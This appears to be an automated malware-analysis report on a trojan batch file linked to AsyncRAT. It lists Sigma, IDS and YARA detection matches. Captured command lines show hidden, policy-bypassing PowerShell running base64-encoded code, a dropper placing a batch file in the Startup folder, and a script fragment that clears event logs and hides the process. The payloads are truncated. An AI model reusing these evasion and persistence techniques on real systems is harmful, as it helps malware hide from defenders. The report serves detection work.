threat_severity.level_description: Severity MEDIUM because it was considered trojan.

sigma_analysis_results.rule_description: Drops script at startup location

match_context.values: @{CommandLine=\??\C:\Windows\system32\conhost.exe; Image=\??\C:\Windows\system32\conhost.exe; EventID=1}

sigma_analysis_results.rule_title: Suspicious Eventlog Clearing or Configuration Change Activity
sigma_analysis_results.rule_description:
Detects the clearing or configuration tampering of EventLog using utilities such as "wevtutil", "powershell" and "wmic".
This technique were seen used by threat actors and ransomware strains in order to evade defenses.
sigma_analysis_results.rule_author: Ecco, Daniil Yugoslavskiy, oscd.community, D3F7A5105, Swachchhanda Shrawan Poudel (Nextron Systems)

sigma_analysis_results.rule_description: Detects PowerShell scripts attempting to disable scheduled scanning and other parts of Windows Defender ATP or set default actions to allow.
sigma_analysis_results.rule_author: frack113, elhoim, Tim Shelton (fps, alias support), Swachchhanda Shrawan Poudel, Nasreddine Bencherchali (Nextron Systems)

sigma_analysis_results.rule_description:
Powerup tool's Write Hijack DLL exploits DLL hijacking for privilege escalation.
In it's default mode, it builds a self deleting .bat file which executes malicious command.
The detection rule relies on creation of the malicious bat file (debug.bat by default).

match_context.values: @{RuleName=T1023; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\0c1d.bat; EventID=11}

sigma_analysis_results.rule_title: Change PowerShell Policies to an Insecure Level
sigma_analysis_results.rule_description: Detects changing the PowerShell script execution policy to a potentially insecure level using the "-ExecutionPolicy" flag.

match_context.values: @{Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine=C:\Windows\system32\cmd.exe  /K "C:\Users\Bruno\AppData\Local\Temp\MaracujaSussdattel.bat"   ; CommandLine=""C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe""  -noprofile -windowstyle hidden -ep bypass -Command ""iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(' [TRUNCATED]; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Windows\SysWOW64\cmd.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=3D6861E137699ADD6E1DB51E2F9D96A9FC4F122D,MD5=1089F6E6C6C219009F75C637ED302F99,SHA256=5A1D9329C862C908B050896FEFA49628D00A914EE2155CEFCAA7704BD1A5E2C8,IMPHASH=FF24CEF596AA4AA9D65391184A89D008; CurrentDirectory=C:\Windows\System32\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\system32\cmd.exe  /K "C:\Users\Bruno\AppData\Local\Temp\MaracujaSussdattel.bat"   ; CommandLine=""C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe""  -noprofile -windowstyle hidden -ep bypass -Command ""iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(' [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{CommandLine=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -noprofile -windowstyle hidden -ep bypass -Command iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String( [TRUNCATED]; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; EventID=1}

sigma_analysis_results.rule_title: Read Contents From Stdin Via Cmd.EXE
sigma_analysis_results.rule_description: Detect the use of "<" to read and potentially execute a file via cmd.exe

match_context.values: @{CommandLine=C:\Windows\system32\cmd.exe /K C:\Users\<USER>\AppData\Local\Temp\MaracujaSussdattel.bat; Image=C:\Windows\system32\cmd.exe; EventID=1}

sigma_analysis_results.rule_title: Use Short Name Path in Command Line
sigma_analysis_results.rule_description: Detect use of the Windows 8.3 short name. Which could be used as a method to avoid command-line detection

match_context.values: @{CommandLine=C:\Windows\system32\cmd.exe  /K "C:\Users\ADMINI~1\AppData\Local\Temp\MaracujaSussdattel.bat"; Image=C:\Windows\system32\cmd.exe; EventID=1}
@{CommandLine=cmd /c ""C:\Users\ADMINI~1\AppData\Local\Temp\MaracujaSussdattel.bat" "; Image=cmd; EventID=1}

sigma_analysis_results.rule_title: Change PowerShell Policies to an Insecure Level - PowerShell
sigma_analysis_results.rule_description: Detects changing the PowerShell script execution policy to a potentially insecure level using the "Set-ExecutionPolicy" cmdlet.
A General detection for files being created in the Windows startup directory. This could be an indicator of persistence.

match_context.values: @{RuleName=T1023; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\0c1d.bat}

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden
Detects keywords that could indicate clearing PowerShell history
sigma_analysis_results.rule_author: Ilyas Ochkov, Jonhnathan Ribeiro, Daniil Yugoslavskiy, oscd.community

sigma_analysis_results.rule_description: Detects usage of known powershell cmdlets such as "Clear-EventLog" to clear the Windows event logs
sigma_analysis_results.rule_author: Nasreddine Bencherchali (Nextron Systems), Swachchhanda Shrawan Poudel (Nextron Systems)

match_context.values:
@{ScriptBlockText=function Initialize-Framework {
    Hide-ConsoleWindow
    Set-ProcessStealth
    Clear-EventLogs
    Disable-ProcessMonitoring
    
    $enc = [System.Text.Encoding]::UTF8
    $b64 = [System.Convert]
    $global:config.k1 = $enc.GetString($b64::FromBase64String('U3lzdGVtLldpbmRvd3MuRm9ybXM='))
    $global:config.k2 = $enc.GetString($b64::FromBase64String('VW5zYWZlTmF0aXZlTWV0aG9kcw=='))
    $global:config.k3 = [byte[]]@(71,101,116,77,111,100,117,108,101,72,97,110,100,108,101)
    $gl [TRUNCATED]; MessageTotal=1; ScriptBlockId=2c9bbafe-09eb-4110-b435-9635b8e88d8c; Path=; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_description: Detects potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Perez Diego (@darkquassar), Tuan Le (NCSGroup)

sigma_analysis_results.rule_description: Detects execution of "csc.exe" to compile .NET code. Attackers often leverage this to compile code on the fly and use it in other stages.

match_context.values: @{Product=Microsoft\xae .NET Framework; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=csc.exe; Hashes=MD5=EB80BB1CA9B9C7F516FF69AFCFD75B7D,SHA256=38C407DBF41E99396B78D00DD796930D8838DCB4AF77C3F23BA0E800D1213EBE,IMPHASH=950FB6F62526333E663D35BA72D19DDC; Description=Visual C# Command Line Compiler; EventID=1; ParentCommandLine=""C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe""  -noprofile -windowstyle hidden -ep bypass -Command ""iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(' [TRUNCATED]; CommandLine="C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Bruno\AppData\Local\Temp\x5i1srin\x5i1srin.cmdline"; FileVersion=4.8.4084.0 built by: NET48REL1; ParentImage=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae .NET Framework; CurrentDirectory=C:\Windows\System32\; OriginalFileName=csc.exe; Hashes=SHA1=E3CCD845830D4059A76521E095230549FC7FCB17,MD5=62192216CE5BA62C44297544C18A48C0,SHA256=34E102F9AD249B343099913CF4EEA2334DECFAF0529314DE256EEFE77D04212B,IMPHASH=E71FED45B53EFEB0043B037EB03A1D12; Description=Visual C# Command Line Compiler; FileVersion=4.8.9032.0 built by: NET481REL1; ParentCommandLine=""C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe""  -noprofile -windowstyle hidden -ep bypass -Command ""iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(' [TRUNCATED]; CommandLine="C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Bruno\AppData\Local\Temp\zgdmkp3l\zgdmkp3l.cmdline"; EventID=1; ParentImage=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe; Company=Microsoft Corporation}

@{CommandLine=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /noconfig /fullpaths @C:\Users\<USER>\AppData\Local\Temp\hy14tsqw\hy14tsqw.cmdline; Image=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe; EventID=1}

sigma_analysis_results.rule_title: Potential Binary Or Script Dropper Via PowerShell
sigma_analysis_results.rule_description: Detects PowerShell creating a binary executable or a script file.

match_context.values: @{RuleName=T1023; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\0c1d.bat; EventID=11}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\system32\cmd.exe  /K "C:\Users\Bruno\AppData\Local\Temp\MaracujaSussdattel.bat"   ; CommandLine=""C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe""  -noprofile -windowstyle hidden -ep bypass -Command ""iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(' [TRUNCATED]; EventID=1; ParentImage=C:\Windows\SysWOW64\cmd.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
When C# is compiled dynamically, a .cmdline file will be created as a part of the process.
Certain processes are not typically observed compiling C# code, but can do so without touching disk.
This can be used to unpack a payload for execution

match_context.values: @{Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\x5i1srin\x5i1srin.cmdline; EventID=11}
@{Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\zgdmkp3l\zgdmkp3l.cmdline}
@{TargetFilename=C:\Users\<USER>\AppData\Local\Temp\hy14tsqw\hy14tsqw.cmdline}

sigma_analysis_results.rule_description: Get the processes that are running on the local computer.
Detects the use of PowerShell to identify the current logged user.

crowdsourced_ids_results.rule_category: Domain Observed Used for C2 Detected
crowdsourced_ids_results.rule_msg: ET MALWARE Observed Malicious SSL Cert (AsyncRAT Server)
crowdsourced_ids_results.rule_raw: alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:"ET MALWARE Observed Malicious SSL Cert (AsyncRAT Server)"; flow:established,to_client; tls.cert_issuer; content:"AsyncRAT Server"; reference:md5,f69cadedae72d9d1a1d1578b56c39404; classtype:domain-c2; sid:2030673; rev:2; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_and_Server, created_at 2020_08_11, deployment Perimeter, malware_family AsyncRAT, performance_impact Low, confidence High, signature_severity Major, tag SSL_Malicious_Cert, updated_at 2022_03_24, reviewed_at 2024_04_01, mitre_tactic_id TA0011, mitre_tactic_name Command_And_Control, mitre_technique_id T1071, mitre_technique_name Application_Layer_Protocol;)

crowdsourced_ids_results.rule_category: Domain Observed Used for C2 Detected
crowdsourced_ids_results.rule_msg: ET MALWARE Generic AsyncRAT/zgRAT Style SSL Cert
crowdsourced_ids_results.rule_raw: alert tls $EXTERNAL_NET [!5222,!7687] -> $HOME_NET any (msg:"ET MALWARE Generic AsyncRAT/zgRAT Style SSL Cert"; flow:established,to_client; content:!"infinitecampus.com"; content:"|0f 39 39 39 39 31 32 33 31 32 33 35 39 35 39 5a|"; fast_pattern; content:"|55 04 03|"; pcre:"/^.(?P<servercert>[\x00-\xff][\x20-\x7f]{1,50})\x30.+?\x55\x04\x03.(?P=servercert)\x30/Rsi"; tls.cert_subject; content:"CN="; startswith; content:!"O="; content:!"OU="; content:!"ST="; tls.cert_issuer; content:"CN="; startswith; content:!"O="; content:!"OU="; content:!"ST="; content:!".com"; content:!"CN=localhost"; content:!"CN=ForFunLabs"; reference:md5,7ed7bf7ea7a1551218f73774d28be76c; classtype:domain-c2; sid:2035595; rev:6; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, tls_state plaintext, created_at 2021_09_13, deployment Perimeter, confidence Medium, signature_severity Major, updated_at 2022_08_01, reviewed_at 2024_05_06; target:src_ip;)

crowdsourced_ids_results.rule_msg: ET INFO DYNAMIC_DNS Query to *.duckdns. Domain
crowdsourced_ids_results.rule_raw: alert dns $HOME_NET any -> any any (msg:"ET INFO DYNAMIC_DNS Query to *.duckdns. Domain"; dns.query; content:".duckdns."; nocase; classtype:misc-activity; sid:2022918; rev:4; metadata:created_at 2016_06_27, confidence Medium, signature_severity Informational, updated_at 2022_11_30, reviewed_at 2024_04_16;)

crowdsourced_ids_results.rule_msg: ET INFO DYNAMIC_DNS Query to a *.duckdns .org Domain
crowdsourced_ids_results.rule_raw: alert dns $HOME_NET any -> any any (msg:"ET INFO DYNAMIC_DNS Query to a *.duckdns .org Domain"; dns.query; content:".duckdns.org"; fast_pattern; nocase; endswith; reference:url,changeip.com; classtype:bad-unknown; sid:2042936; rev:2; metadata:attack_target Client_and_Server, created_at 2022_12_15, deployment Perimeter, performance_impact Low, confidence High, signature_severity Informational, updated_at 2023_03_02, mitre_tactic_id TA0011, mitre_tactic_name Command_And_Control, mitre_technique_id T1568, mitre_technique_name Dynamic_Resolution;)

crowdsourced_yara_results.description: This signature detects base64 encoded Powershell directives.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: Detects suspicious UTF16 and Base64 encoded PowerShell code that starts with a $ sign and a single char variable
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

attributes.magic: ASCII text, with very long lines (48405u), with CRLF line terminators
